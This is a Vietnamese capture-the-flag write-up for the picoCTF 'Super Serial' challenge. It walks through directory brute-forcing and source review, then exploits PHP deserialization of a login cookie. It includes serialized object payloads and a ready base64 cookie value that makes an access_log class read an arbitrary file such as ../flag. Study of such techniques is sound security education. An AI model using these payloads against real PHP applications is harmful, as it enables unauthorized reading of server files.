# Super Serial
### Thử thách:
- Try to recover the flag stored on this website [http://mercury.picoctf.net:2148/](http://mercury.picoctf.net:2148/)
- Hint: The flag is at ../flag.
### Kiến thức nền:
- PHP deserialization injection.
### Giải quyết vấn đề:
1/ Initial reconnaissance:

- Đề bài cho ta một trang login như sau:
 
![image](https://user-images.githubusercontent.com/61876488/115115640-bb9b0200-9fbf-11eb-866b-30765f2431d4.png)

- Thường thì khi nhìn vào các trang login như thế này thì ta nghĩ ngay đến việc tìm cách bypass để vào được một normal user hay admin nào đó. Tên bài là "Super Serial" làm mình có cảm giác trang login này sẽ bị dính lỗi "PHP deserialization injection". Các lỗi liên quan đến deserialization thường xuất hiện ở các session cookie. Hiểu sơ sơ sau khi login thành công thì mỗi user sẽ được phát 1 cái cookie như này. Tuy nhiên, lại quay về vấn đề cũ, chúng ta vẫn chưa biết làm cách nào để bypass cái trang login này! Thử reconnaissance xem trang login này còn manh mối gì nữa không. Sử dụng [ffuf](https://github.com/ffuf/ffuf) để brute-force directory của URL đã cho:

![image](https://user-images.githubusercontent.com/61876488/115120304-0aa06180-9fd7-11eb-9c65-c5d29e7f870d.png)

- Như vậy, source của trang này gồm 3 file php là index, cookie và authentication. Các bài ctf code bằng php thì hay cho đọc source thông qua file [phps](https://stackoverflow.com/questions/41689479/what-is-the-file-extension-phps-and-what-is-it-used-for). Uầy, bài này cho source thật:
![image](https://user-images.githubusercontent.com/61876488/115120456-d8dbca80-9fd7-11eb-929c-1b36316ad638.png)

Thử đem hết đống source code này về dựng trên local host để xem nó hoạt động như nào. 

2/ Rebuild the environment and review source code:

a) Rebuild the environment:
- Các cài đặt cần thiết: php, sqlite3, các module để kết nối PHP với SQLite3 như pdo_sqlite hay [php-sqlite3](https://www.getastra.com/kb/knowledgebase/how-to-install-sqlite-for-php-on-my-apache-nginx-server/) (kiểm tra các PHP module bằng lệnh `php -m`).
- Để ý trong source phần cookie.php có đoạn sau:
```php
$con = new SQLite3("../users.db");
$username = $this->username;
$password = $this->password;
$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
```
Điều này đồng nghĩa rằng chúng ta phải tạo thêm một file [flat database](https://www.techopedia.com/definition/25330/flat-database) users.db chứa username và password (tất nhiên là fake, btw, chúng ta đang ở local host, thích làm gì mà chả được :v):
\+ Tạo database: `sqlite3 users`
\+ Tạo table: 
```SQL
CREATE TABLE users(
   admin BOOLEAN NOT NULL CHECK (admin IN (0, 1)),
   username VARCHAR(20) NOT NULL,
   password VARCHAR(20) NOT NULL       
)
```
\+ Insert data:
```SQL
INSERT INTO users VALUES ('1','antoine','12345'); // admin account
INSERT INTO users VALUES ('0','messi','12345'); // guest account
```
- Bây  giờ thì chúng ta đã có hai account để login vào là "antoine" và "messi". Test thử xem sao:

\+ antoine:

![image](https://user-images.githubusercontent.com/61876488/115133042-5121aa80-a02f-11eb-8cd5-34d064562029.png)

\+ messi:

![image](https://user-images.githubusercontent.com/61876488/115133101-e0c75900-a02f-11eb-901c-069d7fd75e27.png)

- Nhìn chung sau khi login vào thì ta sẽ được direct đến "authentication.php". Đồng thời trang web sẽ tạo ra một session cookie tên "login" (F12 để check).

b) Review source code:
- index.php:
```php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
```
\+ username và password được gửi đến server thông qua method POST.

\+ username và password được truyền vào object “perm_res” để authenticate.

\+ Nếu method “is_guest” hay “is_admin” của object “perm_res” trả về “true” thì cookie “login” sẽ được tạo ra và header “Location” sẽ set value bằng “authentication.php” (direct từ trang login sang trang “welcome”).

\+ Cookie “login” được tạo ra bằng cách serialize object “perm_res” sau đó base64 và urlencode. (có khả năng khai thác được PHP deserialization).

- cookie.php:
```php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}
```
\+ Hàm is_guest  và is_admin của class permissions hoạt động tương  tự như nhau, đều check 2 attribute username và password của class permission bằng cách truy vấn vào database “users.db” để check xem account có exist hay không. Vì hai hàm này đều sử dụng “prepared statements” và “parameterized queries” để execute truy vấn nên việc inject các object php nhằm mục đích exploit SQLi là bất khả thi. Ví dụ:
`O:11:"permissions":2:{s:8:"username";s:7:"antoine";s:8:"password";s:12:"a' OR 1=1 --";}`
không thể exploit được.

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
\+ Khối lệnh if này check xem cookie “login” đã được serialize đúng cách chưa (khi modify lại cookie “login” trên storage cần lưu ý điều này). Nếu không đúng sẽ trả về dòng lỗi “Deserialization error.” kèm theo data bị unserialize lỗi ra. 

- authentication.php:
```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```
\+ Class “access_log” có 2 magic method là “__construct” và “__toString”. Trong đó method “__toString” trả về kết quả của hàm read_log. Hàm read_log lại trả về nội dung của file được truyền vào constructor của class “access_log” thông qua hàm file_get_contents.
\+ Magic method sẽ chạy khi class được khởi tạo, do đó chúng ta lợi dụng lỗi PHP deserialization để khởi tạo 1 object “access_log”, truyền vào nó 1 đường dẫn file bất kì, method “__toString” sẽ chạy và in ra nội dung của file. Vì ở trên local host không có file "flag" nên chúng ta sẽ lấy file "access.log" làm ví dụ. Encode (base64 rồi url) và inject payload này vào cookie "login":
` O:10:"access_log":1:{s:8:"log_file";s:10:"access.log";} `
ta được kết quả:

![image](https://user-images.githubusercontent.com/61876488/115134652-31dd4a00-a03c-11eb-8846-3d0923919ab5.png)

3/ Exploitation:

- Vào URL: http://mercury.picoctf.net:2148/authentication.php
- Tạo 1 cookie login với value là: 
`TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`
(plaintext: `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`, vì trong hint có ghi "The flag is at ../flag.")
- Refresh lại trang ta thu được flag:

![image](https://user-images.githubusercontent.com/61876488/115134775-600f5980-a03d-11eb-819d-1c30cd4129e7.png)
